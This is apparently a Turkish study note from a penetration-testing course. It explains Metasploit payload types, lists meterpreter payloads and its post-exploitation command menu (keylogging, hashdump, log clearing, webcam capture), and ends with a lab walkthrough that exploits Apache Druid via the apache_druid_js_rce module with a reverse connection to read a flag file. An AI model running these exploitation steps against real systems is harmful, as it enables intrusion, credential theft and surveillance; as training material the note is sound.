---
glightbox: true
icon: material/help
---

# Payloads

Payload, savunmasız bir hizmetin standart işleyiş prosedürlerini atlamak (bu işi exploit üstlenir) için exploit ile gönderilir ve ardından saldırgana ters bir bağlantı döndürmek (bu işi payload üstlenir) için hedef işletim sistemi üzerinde çalıştırılır.

Metasploit Framework ile kullanılabilecek üç farklı türde payload modülü vardır:

1. Singles
2. Stagers
3. Stages

## Singles

Bir Single, seçilen görev için exploit ve shell kodunun tamamını bünyesinde barındırır ve bu sebeple daha kararlıdır. Ancak bu tarz bir payload, boyut olarak çok büyük olabileceğinden her exploit ile kullanılamaz.

## Stagers

Bir Stager, belirli bir görevi gerçekleştirmek için Stage payload ile çalışır. Bir Stager, uzak makinede bulunan Stage kodunun çalışmasını tamamlamasını bekler. Stager çoğu durumda saldırgan ile kurban arasında bir ağ bağlantısı kurmak için kullanılır. Küçük ve güvenilir olacak şekilde tasarlanmıştır.

## Stages

Bir Stage, Stager modülü tarafından indirilen payload bileşenidir.

## Staged Payloads

Bir Staged Payload, modüler hale getirilmiş ve işlevsel olarak ayrılmış bir exploit sürecidir.

Stage0, hedef makinenin güvenlik açığı bulunan hizmetine gönderilen ve saldırgan makineye geri bağlantı başlatma amacı taşıyan shell kodunu temsil eder.

Saldırgan ile kurban arasında istikrarlı bir iletişim kanalı oluşturulduktan sonra, saldırgan makine, shell erişimi sağlamak amacıyla daha büyük bir payload gönderir. Bu payload, Stage1 olarak ifade edilir.

## Searching for Payloads

### MSF - List Payloads

```text
show payloads
```

```text title="Output"
...SNIP...

515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64

...SNIP...
```

### MSF - Searching for Specific Payload

```text
grep meterpreter grep reverse_tcp show payloads
```

```text title="Output"
15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

## Selecting Payloads

```text
set payload 15
```

```text title="Output"
payload => windows/x64/meterpreter/reverse_tcp
```

## MSF - Meterpreter Commands

```text
help
```

```text title="Output"
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of Unicode strings
    enable_unicode_encoding   Enables encoding of Unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    IRB                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Strap: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    LCD           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    PWD           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Strap: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    get proxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of hostnames on the target
    route         View and modify the routing table


Strap: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Strap: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idle time       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real-time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Strap: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    get system     Attempt to elevate your privilege to that of the local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestamp Commands
========================

    Command       Description
    -------       -----------
    timestamp     Manipulate file MACE attributes
```

## Payload Types

| Payload | Description |
|---|---|
| `generic/custom` | Genel dinleyici, çoklu kullanım. |
| `generic/shell_bind_tcp` | Genel dinleyici, çoklu kullanım, normal shell, bind TCP bağlantısı. |
| `generic/shell_reverse_tcp` | Genel dinleyici, çoklu kullanım, normal shell, reverse TCP bağlantısı. |
| `windows/x64/exec` | Rastgele komut yürütme. |
| `windows/x64/loadlibrary` | Rastgele x64 kitaplık yolu yükleme. |
| `windows/x64/messagebox` | Mesaj kutusu açma. |
| `windows/x64/shell_reverse_tcp` | Normal shell, Single, reverse TCP bağlantısı. |
| `windows/x64/shell/reverse_tcp` | Normal shell, Stager ve Stage, reverse TCP bağlantısı. |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, Stager ve Stage, IPv6 bind TCP Stager. |

## Questions

```text
Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
```

??? tip "Steps"

    Öncelikle Msfconsole aracını başlat:

    ```bash
    sudo msfconsole
    ```

    Aşağıdaki aramayı gerçekleştir:

    ```text
    search apache druid
    ```

    Çıkan sonuçlardan ilgili exploit modülünü kullan:

    ```text
    use exploit/linux/http/apache_druid_js_rce
    ```

    RHOSTS değerini ayarla:

    ```text
    set RHOSTS 10.129.215.58
    ```

    LHOST değerini ayarla:

    ```text
    set LHOST 10.10.14.87
    ```

    Exploit başlat:

    ```text
    exploit
    ```

    Sistem shell aktif et:

    ```text
    shell
    ```

    Flag dosyasının konumunu bulmak için aşağıdaki komutu çalıştır:

    ```bash
    sudo find / -name flag.txt -type f 2> /dev/null
    ```

    ```text title="Output"
    /root/flag.txt
    ```

    Bulunan dosyanın içeriğini görüntülemek için aşağıdaki komutu çalıştır:

    ```bash
    cat /root/flag.txt
    ```
